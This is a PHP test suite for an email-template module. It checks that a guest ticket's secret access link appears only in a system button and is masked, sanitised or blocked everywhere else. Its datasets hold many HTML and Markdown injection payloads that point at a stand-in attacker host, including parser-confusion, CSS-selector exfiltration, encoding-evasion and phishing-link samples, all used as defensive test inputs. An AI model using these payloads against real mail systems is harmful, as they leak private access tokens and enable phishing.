<?php

use App\Contracts\Auth\AuthMailer;
use App\Data\Notifications\SensitiveValue;
use App\Models\User;
use App\Modules\Core\Models\ActivityLog;
use App\Modules\Core\Models\Client;
use App\Modules\Core\Support\Settings;
use App\Modules\Notifications\Data\EmailRequest;
use App\Modules\Notifications\Mail\TemplatedMail;
use App\Modules\Notifications\Models\EmailMessage;
use App\Modules\Notifications\Models\EmailTemplate;
use App\Modules\Notifications\Rendering\TemplateEngine;
use App\Modules\Notifications\Services\EmailComposer;
use App\Modules\Notifications\Services\MergeContext;
use App\Modules\Notifications\Services\NotificationMailer;
use App\Modules\Notifications\Services\RecipientResolver;
use App\Modules\Notifications\Support\SecretTemplatePolicy;
use App\Modules\Notifications\Webhooks\WebhookPublisher;
use App\Support\Dashboard\Dashboard;
use Dom\HTMLDocument;
use Illuminate\Auth\Notifications\VerifyEmail;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Notification;

require_once __DIR__.'/helpers.php';
require_once __DIR__.'/../Support/helpers.php';

/*
 * Security review PR #28, B1 (final): staff-editable text never carries an access link, in any template. The guest
 * ticket link goes out only as the system's own button, added after the mail is built (Markdown, layout, CSS
 * inlining); staff content in that mail is reduced to an allow-list, and the finished HTML must hold the link
 * exactly once, as that button's href, to both the HTML5 parser and libxml — otherwise nothing is sent.
 */

function guestUrl(): string
{
    return url('/support/tickets/482913?key=GUESTKEY');
}

dataset('staff attempts', [
    // Round 3: nesting the link inside other markup.
    'inside a Markdown image URL' => ["![p](https://evil.test/p.png?[x]({{ ticket.url }}))\n\nHi"],
    'inside an HTML src' => ["<img src=\"https://evil.test/p.png?[x]({{ ticket.url }})\">\n\nHi"],
    'inside another link\'s URL' => ['Hi [Open](https://evil.test/go?[x]({{ ticket.url }})) there'],
    'in another link\'s query string' => ['Hi [Open](https://evil.test/go?u={{ ticket.url }}) there'],
    'in an HTML href query string' => ['Hi <a href="https://evil.test/go?u={{ ticket.url }}">Open</a> there'],
    'as an image source' => ['![p]({{ ticket.url }})'],
    'in another attribute' => ['<a href="https://evil.test/" title="{{ ticket.url }}">Open</a>'],
    'as a link label' => ['[{{ ticket.url }}]({{ ticket.url }})'],
    'as plain text' => ['Your link: {{ ticket.url }}'],
    'as a whole link target' => ['[View ticket]({{ ticket.url }})'],
    // Final check: raw-text elements that libxml parses as markup, to swallow the link into an image URL.
    'xmp swallow' => ["<xmp><img src='https://evil.test/p.png?</xmp><a href=\"{{ ticket.url }}\">View ticket</a>'>"],
    'noembed swallow' => ["<noembed><img src='https://evil.test/p.png?</noembed><a href=\"{{ ticket.url }}\">View ticket</a>'>"],
    'noframes swallow' => ["<noframes><img src='https://evil.test/p.png?</noframes><a href=\"{{ ticket.url }}\">View ticket</a>'>"],
    'style inside xmp' => ["<xmp><style>a[href*=key]{background:url(https://evil.test/s.png)}</style></xmp>\n\n[View ticket]({{ ticket.url }})"],
    'Markdown link inside xmp' => ["<xmp><img src='https://evil.test/p.png?</xmp>[View ticket]({{ ticket.url }})'>"],
]);

dataset('swallowing the system button', [
    'open image quote' => ["Hi\n\n<img src='https://evil.test/p.png?"],
    'xmp then open quote' => ["<xmp><img src='https://evil.test/p.png?</xmp>"],
    'noembed then open quote' => ["<noembed><img src='https://evil.test/p.png?</noembed>"],
    'noframes then open quote' => ["<noframes><img src='https://evil.test/p.png?</noframes>"],
    'plaintext' => ["<plaintext><img src='https://evil.test/p.png?"],
    'textarea' => ["<textarea><img src='https://evil.test/p.png?</textarea>"],
    'title in body' => ["<p><title><img src='https://evil.test/p.png?</title></p>"],
    'quote in an attribute name' => ["<p><i a'=\"1\" b=\"<img src='https://evil.test/p.png?\"></i></p>"],
    'comment dashes' => ["<p><!-- x --!><img src='https://evil.test/p.png? --></p>"],
    'style selector' => ['<style>a[href*="key="]{background:url(https://evil.test/x.png)}</style>'],
    'form and ping link' => ['<form action="https://evil.test/f"><button>Go</button></form><a href="http://localhost/x" ping="https://evil.test/ping" onclick="x()">x</a>'],
    'blank line entities' => ['<p>a&#10;&#10;![x](https://evil.test/x.png?</p>'],
]);

/**
 * @return array{0: string, 1: string} [html, text]
 */
function sendGuestTicketMail(string $body, string $replyHtml = ''): array
{
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->translations()->update(['body' => $body."\n\n".$replyHtml]);
    $context = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'requester_email' => 'guest@example.test', 'url' => new SensitiveValue(guestUrl(), secret: 'GUESTKEY')]];

    app(NotificationMailer::class)->send(new EmailRequest('ticket.autoresponse', app(RecipientResolver::class)->addresses(['guest@example.test']), $context, 'guest|'.md5($body)));

    $parts = ['', ''];
    Mail::assertSent(TemplatedMail::class, function (TemplatedMail $mail) use (&$parts): bool {
        $parts = [(string) $mail->htmlBody, (string) $mail->plainText];

        return true;
    });

    return $parts;
}

/**
 * No element (to either parser) has an attribute pointing at the attacker's host or a handler, and no style sheet
 * mentions it.
 */
function noForeignMarkup(string $html): bool
{
    $libxml = new DOMDocument;
    @$libxml->loadHTML('<?xml encoding="UTF-8">'.$html);

    foreach ([HTMLDocument::createFromString($html, LIBXML_NOERROR), $libxml] as $document) {
        foreach ($document->getElementsByTagName('*') as $element) {
            foreach ($element->attributes as $attribute) {
                if (str_contains($attribute->value, 'evil.test') || str_starts_with(strtolower($attribute->name), 'on') || strtolower($attribute->name) === 'ping') {
                    return false;
                }
            }
        }

        foreach ($document->getElementsByTagName('style') as $style) {
            if (str_contains($style->textContent, 'evil.test')) {
                return false;
            }
        }
    }

    return true;
}

/**
 * The key appears once in the HTML, as the href of the system button, to the HTML5 parser and to libxml.
 */
function keyOnlyInSystemButton(string $html): bool
{
    $libxml = new DOMDocument;
    @$libxml->loadHTML('<?xml encoding="UTF-8">'.$html);

    foreach ([HTMLDocument::createFromString($html, LIBXML_NOERROR), $libxml] as $document) {
        $hits = 0;

        foreach ($document->getElementsByTagName('*') as $element) {
            foreach ($element->attributes as $attribute) {
                if (! str_contains($attribute->value, 'GUESTKEY')) {
                    continue;
                }

                if (strtolower($element->localName) !== 'a' || $attribute->name !== 'href' || $attribute->value !== guestUrl() || ! str_contains($element->getAttribute('class'), 'button')) {
                    return false;
                }

                $hits++;
            }
        }

        if ($hits !== 1 || str_contains($document->documentElement->textContent, 'GUESTKEY')) {
            return false;
        }
    }

    return substr_count($html, 'GUESTKEY') === 1;
}

it('rejects any use of the guest link in staff text on save', function (string $body) {
    seedEmailTemplates();

    expect(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => 'Re: ticket', 'body' => $body]))->toHaveKey('body');
})->with('staff attempts');

it('rejects it in every template and field, over HTTP too', function () {
    seedEmailTemplates();
    actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
    confirmPassword();
    $template = EmailTemplate::query()->where('key', 'ticket.reply')->sole();

    $this->put(route('admin.notifications.templates.update', $template), [
        'name' => $template->name, 'locale' => 'en', 'subject' => 'Reply', 'body' => "We replied.\n\n[View ticket]({{ ticket.url }})",
    ])->assertSessionHasErrors('body');

    expect(SecretTemplatePolicy::violations('custom.copy', ['subject' => '{{ ticket.url }}', 'body' => 'x']))->toHaveKey('subject')
        ->and(SecretTemplatePolicy::violations('ticket.reply', ['subject' => 'x', 'body' => 'x', 'action_label' => 'Open https://evil.test']))->toHaveKey('action_label')
        ->and(SecretTemplatePolicy::violations('ticket.reply', ['subject' => 'x', 'body' => 'x', 'action_label' => 'Open ticket {{ ticket.url }}']))->toHaveKey('action_label')
        ->and(SecretTemplatePolicy::violations('ticket.reply', ['subject' => 'x', 'body' => 'We replied.', 'action_label' => 'Open your ticket']))->toBe([]);
});

it('puts the key only in the system button when the template was written to the database directly', function (string $body) {
    [$html, $text] = sendGuestTicketMail($body);

    expect(keyOnlyInSystemButton($html))->toBeTrue()
        ->and(noForeignMarkup($html))->toBeTrue()
        ->and(substr_count($text, 'GUESTKEY'))->toBe(1)
        ->and($text)->toContain('View your ticket: '.guestUrl());
})->with('staff attempts');

it('keeps staff markup from swallowing the system button', function (string $body) {
    [$html, $text] = sendGuestTicketMail($body);

    expect(keyOnlyInSystemButton($html))->toBeTrue()
        ->and(noForeignMarkup($html))->toBeTrue()
        ->and(substr_count($text, 'GUESTKEY'))->toBe(1);
})->with('swallowing the system button');

it('places the button after the body with the editable label, and the default ticket text has no link', function () {
    seedEmailTemplates();

    foreach (array_keys(SecretTemplatePolicy::SYSTEM_ACTIONS) as $key) {
        expect(EmailTemplate::query()->where('key', $key)->sole()->translations()->sole())
            ->body->not->toContain('ticket.url')
            ->action_label->not->toBeEmpty();
    }

    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->translations()->update(['action_label' => 'Open {{ company.name }} ticket']);
    [$html, $text] = sendGuestTicketMail('We got it.');

    expect($html)->toMatch('#<a href="'.preg_quote(e(guestUrl()), '#').'" class="button"[^>]*>\s*Open .+ ticket\s*</a>#')
        ->and(strpos($html, 'We got it.'))->toBeLessThan(strpos($html, 'GUESTKEY'))
        ->and($text)->toMatch('/We got it\.\R+Open .+ ticket: '.preg_quote(guestUrl(), '/').'/');
});

it('masks the guest\'s own link pasted into a staff reply, and still sends', function () {
    Mail::fake();
    seedEmailTemplates();
    $context = [
        'ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'requester_email' => 'guest@example.test', 'url' => new SensitiveValue(guestUrl(), secret: 'GUESTKEY')],
        'reply' => ['author_name' => 'Sam', 'body_html' => '<p>Your link: '.e(guestUrl()).' or <a href="'.e(guestUrl()).'">this</a> ('.rawurlencode(guestUrl()).')</p>', 'excerpt' => ''],
    ];

    app(NotificationMailer::class)->send(new EmailRequest('ticket.reply', app(RecipientResolver::class)->addresses(['guest@example.test']), $context, 'guest|pasted'));

    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => keyOnlyInSystemButton((string) $mail->htmlBody)
        && str_contains((string) $mail->htmlBody, 'Your link: ••••')
        && substr_count((string) $mail->plainText, 'GUESTKEY') === 1);
    expect(EmailMessage::query()->sole()->status->value)->not->toBe('failed');
});

it('fails closed when the finished mail would hold the key outside the system button (backstop)', function () {
    Mail::fake();
    seedEmailTemplates();
    app(Settings::class)->set('notifications.footer_address', guestUrl()); // layout text, not staff content
    $context = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'requester_email' => 'guest@example.test', 'url' => new SensitiveValue(guestUrl(), secret: 'GUESTKEY')]];

    app(NotificationMailer::class)->send(new EmailRequest('ticket.reply', app(RecipientResolver::class)->addresses(['guest@example.test']), $context, 'guest|dup'));

    Mail::assertNothingSent();
    expect(EmailMessage::query()->sole())->status->value->toBe('failed')
        ->and(ActivityLog::query()->where('event', 'security')->sole())
        ->description->toBe('Email blocked: access link placement check failed');
});

it('uses a fresh random token for the system button slot', function () {
    $tokens = [SecretTemplatePolicy::actionToken(), SecretTemplatePolicy::actionToken()];

    expect($tokens[0])->toMatch('/^zzaction[0-9a-f]{32}zz$/')
        ->and($tokens[0])->not->toBe($tokens[1]);
});

it('checks the finished HTML with both parsers', function () {
    $button = '<table class="action"><tr><td><a href="'.e(guestUrl()).'" class="button">View</a></td></tr></table>';

    expect(SecretTemplatePolicy::placedOnlyAsSystemButton('<p>Hi</p>'.$button, guestUrl()))->toBeTrue()
        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton('<p>Hi</p><a href="'.e(guestUrl()).'">View</a>', guestUrl()))->toBeFalse()
        // HTML5 reads the xmp content as text, libxml as an image whose src holds the button: either way, refused.
        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton("<xmp><img src='https://evil.test/?</xmp>".$button."'>", guestUrl()))->toBeFalse()
        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton('<!-- '.guestUrl().' -->'.$button, guestUrl()))->toBeFalse();
});

it('gets the guest link from Support as a SensitiveValue and mails it only as the system button, end to end', function () {
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->update(['bcc' => ['archive@example.test']]);

    $ticket = guestTicket(email: 'gina@example.test');
    $url = data_get(app(MergeContext::class)->ticket($ticket->id), 'ticket.url');

    expect($url)->toBeInstanceOf(SensitiveValue::class)->and($url->value)->toContain('key='.$ticket->access_key);
    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => $mail->hasTo('gina@example.test')
        && str_contains((string) $mail->htmlBody, 'key='.$ticket->access_key) && $mail->bcc === []);
    expect(EmailMessage::query()->where('template_key', 'ticket.autoresponse')->sole())
        ->has_redactions->toBeTrue()->bcc->toBeNull()
        ->body_html->not->toContain($ticket->access_key)
        ->body_text->not->toContain($ticket->access_key);
});

it('masks a SensitiveValue when cast to a string or JSON', function () {
    $value = new SensitiveValue('https://localhost/x?key=SECRET');

    expect((string) $value)->toBe('••••')
        ->and(json_encode(['url' => $value], JSON_UNESCAPED_UNICODE))->toBe('{"url":"••••"}');
});

it('removes every SensitiveValue from the context of custom and ad-hoc mail', function () {
    Mail::fake();
    seedEmailTemplates();
    $custom = EmailTemplate::factory()->withBody('Copy', '[View]({{ ticket.url }}) {{ ticket.url }}')->create(['key' => 'custom.ticket_copy']);
    $guest = app(RecipientResolver::class)->addresses(['guest@example.test']);
    $context = ['ticket' => ['number' => '1', 'url' => new SensitiveValue(guestUrl())]];

    app(NotificationMailer::class)->send(new EmailRequest($custom->key, $guest, $context, 'copy|1'));
    $adhoc = app(EmailComposer::class)->composeSource('Hi', '[View]({{ ticket.url }})', $context, 'en', templateKey: 'adhoc');

    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => ! str_contains((string) $mail->htmlBody.$mail->plainText, 'GUESTKEY'));
    expect($adhoc->html.$adhoc->text)->not->toContain('GUESTKEY');
});

it('never prints a SensitiveValue from the engine', function () {
    $result = (new TemplateEngine)->render('[a]({{ link }}) {{ link | upper }} {{ link | default("x") }}', ['link' => new SensitiveValue('https://localhost/?key=SECRET')]);

    expect($result->output)->not->toContain('SECRET')
        ->and($result->warnings)->not->toBeEmpty();
});

it('renders secret templates against the allow-list only, with URL-like text removed from account-controlled names', function () {
    $context = SecretTemplatePolicy::textContext([
        'company.name' => 'ignored', 'company' => ['name' => 'Acme Hosting'],
        'user' => ['first_name' => 'Bob evil.test/login https://evil.test/x', 'email' => 'bob@evil.test'],
        'client' => ['company_name' => 'Go to https://evil.test/login'],
        'support' => ['email' => 'help@acme.test', 'url' => 'https://evil.test/support'],
        'auth' => ['reset_url' => new SensitiveValue('https://localhost/reset/T')],
    ]);

    expect($context)->toBe([
        'company' => ['name' => 'Acme Hosting'],
        'user' => ['first_name' => 'Bob'],
        'staff' => ['first_name' => null],
        'auth' => ['expires_at' => null],
        'support' => ['email' => 'help@acme.test'],
        'system' => ['today' => null],
    ]);
});

it('keeps account-controlled values from putting a look-alike link in the reset mail', function () {
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', 'auth.password_reset')->sole()->translations()->update(['body' => 'Hello {{ user.first_name }} of {{ client.company_name }} at {{ user.email }}']);
    $user = User::factory()->create(['name' => 'evil.test/login Bob']);
    Client::factory()->create(['company_name' => 'Go to https://evil.test/login'])->users()->attach($user->id);

    app(AuthMailer::class)->sendPasswordReset($user, 'TOKEN123');

    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => ! str_contains((string) $mail->htmlBody.$mail->plainText, 'evil.test')
        && str_contains((string) $mail->plainText, 'TOKEN123'));
});

it('rejects {% %} blocks in secret templates on save', function () {
    expect(SecretTemplatePolicy::violations('auth.password_reset', ['subject' => 'Reset', 'heading' => 'Reset', 'action_label' => 'Go', 'body' => '{% if user.first_name %}Hi{% endif %}']))
        ->toHaveKey('body');
});

it('strips SensitiveValues from webhook payloads even without a token-like query string', function () {
    $clean = app(WebhookPublisher::class)->sanitize(['ticket' => ['number' => '482913', 'url' => new SensitiveValue('https://localhost/support/tickets/482913/plain')]]);

    expect($clean)->toBe(['ticket' => ['number' => '482913']]);
});

it('fails closed for verification links too: no mail, no fallback, a security entry', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    VerifyEmail::createUrlUsing(fn ($user): string => 'https://portal.example.test/verify/'.$user->id);
    $user = User::factory()->unverified()->create();

    try {
        app(AuthMailer::class)->sendEmailVerification($user);
    } finally {
        VerifyEmail::$createUrlCallback = null;
    }

    Mail::assertNothingSent();
    Mail::assertNothingQueued();
    Notification::assertNothingSent();
    expect(EmailMessage::query()->count())->toBe(0)
        ->and(ActivityLog::query()->where('description', 'Account email blocked: link host not allowed')->sole()->properties)
        ->toMatchArray(['kind' => 'email verification', 'host' => 'portal.example.test']);
});

it('says why account mail is held when APP_URL is http:// in production', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    config(['app.url' => 'http://billing.example.test']);
    app()->detectEnvironment(fn (): string => 'production');
    $user = User::factory()->create();

    try {
        app(AuthMailer::class)->sendPasswordReset($user, 'TOKEN123');
        $health = collect(app(Dashboard::class)->resolveHealth('admin', fullAdministrator()))->firstWhere('key', 'notifications.account_links');
    } finally {
        app()->detectEnvironment(fn (): string => 'testing');
    }

    Mail::assertNothingSent();
    Notification::assertNothingSent();
    expect(ActivityLog::query()->where('event', 'security')->sole()->properties['reason'])->toContain('must use https://')
        ->and($health)->toMatchArray(['value' => 'Held', 'tone' => 'danger'])
        ->and($health['detail'])->toContain('emails are held');
});

/*
 * Security review at e3906ca: every outgoing and stored field, matching on the secret itself, and the sanitizer as
 * the last parser of staff content.
 */

/**
 * @param  array<string, mixed>  $ticket
 * @param  array<string, mixed>  $reply
 * @param  list<string>  $to
 * @return list<TemplatedMail>
 */
function sendGuestReply(string $key, array $ticket = [], array $reply = [], ?string $body = null, array $to = ['guest@example.test'], bool $plainTextOnly = false): array
{
    Mail::fake();
    seedEmailTemplates();
    EmailTemplate::query()->where('key', $key)->sole()->update(['plain_text_only' => $plainTextOnly]);

    if ($body !== null) {
        EmailTemplate::query()->where('key', $key)->sole()->translations()->update(['body' => $body]);
    }

    $context = ['ticket' => [
        'number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High',
        'requester_email' => 'guest@example.test', 'url' => new SensitiveValue(guestUrl(), secret: 'GUESTKEY'), ...$ticket,
    ]];

    if ($reply !== [] || $key === 'ticket.reply') {
        $context['reply'] = ['author_name' => 'Sam', 'body_html' => '<p>x</p>', 'excerpt' => '', ...$reply];
    }

    app(NotificationMailer::class)->send(new EmailRequest($key, app(RecipientResolver::class)->addresses($to), $context, 'guest|'.md5(serialize([$key, $ticket, $reply, $body, $to, $plainTextOnly]))));

    return Mail::sent(TemplatedMail::class)->values()->all();
}

/**
 * No <a> or <img> pointing at the attacker's host, to either parser.
 */
function noOutsideTags(?string $html): bool
{
    $html = (string) $html;
    $libxml = new DOMDocument;
    @$libxml->loadHTML('<?xml encoding="UTF-8">'.$html);

    foreach ([HTMLDocument::createFromString($html, LIBXML_NOERROR), $libxml] as $document) {
        foreach (['a' => 'href', 'img' => 'src'] as $tag => $attribute) {
            foreach ($document->getElementsByTagName($tag) as $element) {
                if (str_contains((string) $element->getAttribute($attribute), 'evil.test')) {
                    return false;
                }
            }
        }
    }

    return true;
}

it('masks the secret in the subject, the stored subject and every other field (B1)', function () {
    [$mail] = sendGuestReply('ticket.reply', ticket: ['subject' => 'See '.guestUrl()], reply: ['body_html' => '<p>hello</p>']);
    $row = EmailMessage::query()->sole();

    expect($mail->subjectLine)->not->toContain('GUESTKEY')->toContain('See ••••')
        ->and($row->subject)->not->toContain('GUESTKEY')
        ->and(keyOnlyInSystemButton((string) $mail->htmlBody))->toBeTrue()
        ->and(substr_count((string) $mail->plainText, 'GUESTKEY'))->toBe(1)
        ->and($row->body_html.$row->body_text)->not->toContain('GUESTKEY');
});

it('masks any copy of the secret, not only the exact link (M1)', function (Closure|string $variant, bool $plainTextOnly = false) {
    $variant = $variant instanceof Closure ? $variant() : $variant;
    [$mail] = sendGuestReply('ticket.reply', reply: ['body_html' => '<p>Link: '.e($variant).' <a href="'.e($variant).'">open</a> '.rawurlencode($variant).'</p>'], plainTextOnly: $plainTextOnly);
    $row = EmailMessage::query()->sole();
    $decodedHits = fn (?string $field): int => substr_count(SecretTemplatePolicy::normalise((string) $field), 'guestkey');

    expect($plainTextOnly ? $mail->htmlBody === null : keyOnlyInSystemButton((string) $mail->htmlBody))->toBeTrue()
        ->and($decodedHits($mail->plainText))->toBe(1)
        ->and($decodedHits($mail->subjectLine.$row->subject.$row->body_html.$row->body_text))->toBe(0);
})->with([
    // Security re-check at e80d639: partial, double and mixed encodings, in HTML and plain-text-only mail.
    'partly percent-encoded' => [fn (): string => url('/support/tickets/482913?key=%47UEST%4BEY')],
    'partly percent-encoded, plain-text-only mail' => [fn (): string => url('/support/tickets/482913?key=%47UEST%4BEY'), true],
    'double percent-encoded' => [fn (): string => url('/support/tickets/482913?key=%2547UESTKEY')],
    'entity and percent mixed' => [fn (): string => url('/support/tickets/482913?key=%47UEST&#x4b;EY')],
    'entity in text' => ['GUEST&#75;EY'],
    'bare key, plain-text-only mail' => ['GUESTKEY', true],
    'extra query parameter first' => [fn (): string => url('/support/tickets/482913?a=1&key=GUESTKEY')],
    'upper-case host' => [fn (): string => str_replace('://localhost', '://LOCALHOST', url('/support/tickets/482913?key=GUESTKEY'))],
    'trailing slash' => [fn (): string => url('/support/tickets/482913/?key=GUESTKEY')],
    'bare key' => ['GUESTKEY'],
    'lower-case key' => ['guestkey'],
]);

it('lets no outside image or link survive: the sanitised body is not parsed as Markdown again (M2)', function (string $body) {
    [$mail] = sendGuestReply('ticket.autoresponse', body: $body);
    $row = EmailMessage::query()->sole();

    expect(noOutsideTags($mail->htmlBody))->toBeTrue()
        ->and(noOutsideTags($row->body_html))->toBeTrue()
        ->and(keyOnlyInSystemButton((string) $mail->htmlBody))->toBeTrue();
})->with([
    'Markdown inside a div' => ["<div>\n![p](https://evil.test/p.png) [go](https://evil.test/phish)\n</div>\n\nHi"],
    'CR entities end the HTML block' => ['<p>a&#13;&#13;![x](https://evil.test/x.png) [go](https://evil.test/phish)</p>'],
]);

it('lets no outside image or link in through a staff reply or the ticket subject', function (string $key, array $ticket, array $reply) {
    [$mail] = sendGuestReply($key, ticket: $ticket, reply: $reply);

    expect(noOutsideTags($mail->htmlBody))->toBeTrue()
        ->and(keyOnlyInSystemButton((string) $mail->htmlBody))->toBeTrue();
})->with([
    'raw CR in a reply' => ['ticket.reply', [], ['body_html' => "<p>a\r\r\\![x](https://evil.test/x.png)</p>"]],
    'raw CR in the subject' => ['ticket.autoresponse', ['subject' => "x\r\r\\![x](https://evil.test/x.png)"], []],
    'CR entity in the subject' => ['ticket.autoresponse', ['subject' => 'x&#13;&#13;\![x](https://evil.test/x.png)'], []],
    'div in the subject' => ['ticket.autoresponse', ['subject' => "<div>\n![x](https://evil.test/x.png)\n</div>"], []],
]);

it('does not treat the logged-in client\'s ticket link as sensitive', function () {
    [$mail] = sendGuestReply('ticket.reply', ticket: ['url' => url('/client/support/tickets/482913')], reply: ['body_html' => '<p>hello <img src="'.url('/logo.png').'"></p>']);

    expect(EmailMessage::query()->sole()->has_redactions)->toBeFalse()
        ->and((string) $mail->htmlBody)->toContain('href="'.e(url('/client/support/tickets/482913')).'" class="button"')
        ->toContain('<img');
});

it('sends ticket CCs the reply without the private link, and only the owner gets the button', function () {
    $mails = sendGuestReply('ticket.reply', reply: ['body_html' => '<p>Fixed.</p>'], to: ['guest@example.test', 'colleague@example.test']);
    $byRecipient = collect($mails)->keyBy(fn (TemplatedMail $mail): string => $mail->to[0]['address']);

    expect($byRecipient)->toHaveCount(2)
        ->and(keyOnlyInSystemButton((string) $byRecipient['guest@example.test']->htmlBody))->toBeTrue()
        ->and((string) $byRecipient['colleague@example.test']->htmlBody.$byRecipient['colleague@example.test']->plainText)
        ->not->toContain('GUESTKEY')
        ->toContain('The ticket owner has the private link')
        ->and((string) $byRecipient['colleague@example.test']->htmlBody)->not->toContain('class="button"');
});

it('never resends mail that carried a private link, and says why', function () {
    [$mail] = sendGuestReply('ticket.reply', reply: ['body_html' => '<p>Fixed.</p>']);
    $row = EmailMessage::query()->sole();
    $row->update(['related_type' => 'ticket', 'related_id' => 5]);
    actingAsStaff(['notifications.log.view', 'notifications.log.resend']);

    $this->get(route('admin.notifications.emails.show', $row))->assertInertia(fn ($page) => $page
        ->where('canResend', false)
        ->where('resendBlocked', 'This email contained a private link. Send the customer a new link instead.')
        ->where('newLink.label', 'Open the ticket'));
    $this->post(route('admin.notifications.emails.resend', $row))->assertStatus(422);

    expect(fn () => app(NotificationMailer::class)->resend($row))->toThrow(LogicException::class);
});

it('finds the secret with one normaliser on the HTML and the text path', function (string $value) {
    $html = '<p>'.$value.'</p><table class="action"><tr><td><a href="'.e(guestUrl()).'" class="button">View</a></td></tr></table>';
    $found = SecretTemplatePolicy::secretCount($value, 'GUESTKEY') > 0;

    // Text path (masking and counting) and HTML path (final check) agree on every encoding.
    expect($found)->toBe(str_contains(SecretTemplatePolicy::normalise($value), 'guestkey'))
        ->and(SecretTemplatePolicy::maskValues($value, ['GUESTKEY']) === '••••')->toBe($found)
        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton($html, guestUrl(), 'GUESTKEY'))->toBe(! $found);
})->with([
    'plain' => ['GUESTKEY'],
    'lower case' => ['guestkey'],
    'partly percent-encoded' => ['%47UEST%4BEY'],
    'double percent-encoded' => ['%2547UESTKEY'],
    'numeric entity' => ['GUEST&#75;EY'],
    'hex entity and percent' => ['%47UEST&#x4b;EY'],
    'inside a link' => ['http://x/?key=%47UESTKEY'],
    'unrelated' => ['GUEST-KEY'],
]);
